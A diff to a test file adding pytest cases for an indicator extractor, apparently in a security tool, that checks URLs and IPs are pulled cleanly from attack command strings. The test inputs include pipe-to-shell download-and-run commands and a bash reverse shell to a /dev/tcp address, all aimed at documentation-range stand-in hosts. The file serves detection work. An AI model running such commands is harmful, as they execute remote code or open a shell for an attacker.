@@ -234,6 +234,19 @@ def test_extract_dedups_same_url():
     assert server._extract_indicators(text) == [{"indicator": "http://192.0.2.77/x", "type": "url"}]
 
 
+@pytest.mark.parametrize(
+    ("text", "url"),
+    [
+        # no-space pipe-to-shell (the corpus obfuscated variants): the pipe is shell
+        # syntax, not part of the URL -- extraction must stop at it.
+        ("curl -fsSL https://192.0.2.88/x|bash", "https://192.0.2.88/x"),
+        ("wget -qO- https://get.example.org/install.sh|sh", "https://get.example.org/install.sh"),
+    ],
+)
+def test_extract_url_stops_at_shell_pipe(text, url):
+    assert server._extract_indicators(text) == [{"indicator": url, "type": "url"}]
+
+
 def test_extract_bare_ip_with_port():
     # /dev/tcp host -- bare IP, and the IPv4 match must not absorb the :port.
     assert server._extract_indicators("bash -i >& /dev/tcp/192.0.2.44/4444 0>&1") == [
